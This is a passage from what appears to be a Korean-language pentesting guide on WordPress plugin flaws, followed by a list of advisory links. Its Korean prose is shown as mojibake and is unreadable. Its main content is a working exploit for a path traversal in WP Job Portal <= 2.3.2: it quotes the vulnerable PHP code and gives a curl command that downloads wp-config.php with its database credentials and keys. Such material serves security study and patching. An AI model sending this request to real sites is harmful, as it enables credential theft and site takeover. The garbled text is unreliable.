ì‘ë‹µì€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³€ê²½í•˜ì—¬ SQLiê°€ ì¡´ì¬í•¨ì„ ì¦ëª…í•©ë‹ˆë‹¤.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

ë˜ ë‹¤ë¥¸ ì‘ì—…ì¸ **downloadcustomfile**ì€ ë°©ë¬¸ìê°€ path traversalì„ í†µí•´ ë””ìŠ¤í¬ìƒì˜ **ëª¨ë“  íŒŒì¼**ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆê²Œ í—ˆìš©í–ˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ sinkëŠ” `modules/customfield/model.php::downloadCustomUploadedFile()`ì— ìœ„ì¹˜í•©ë‹ˆë‹¤:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **without sanitisation** ìƒíƒœë¡œ ì—°ê²°ë©ë‹ˆë‹¤. ë‹¤ì‹œ ë§í•´, ìœ ì¼í•œ ê´€ë¬¸ì€ resume í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### ì•…ìš©
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ì„œë²„ê°€ `wp-config.php`ì˜ ë‚´ìš©ì„ ë°˜í™˜í•˜ì—¬ DB credentials ë° auth keysë¥¼ leaking í•©ë‹ˆë‹¤.

## ì°¸ê³ ìë£Œ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
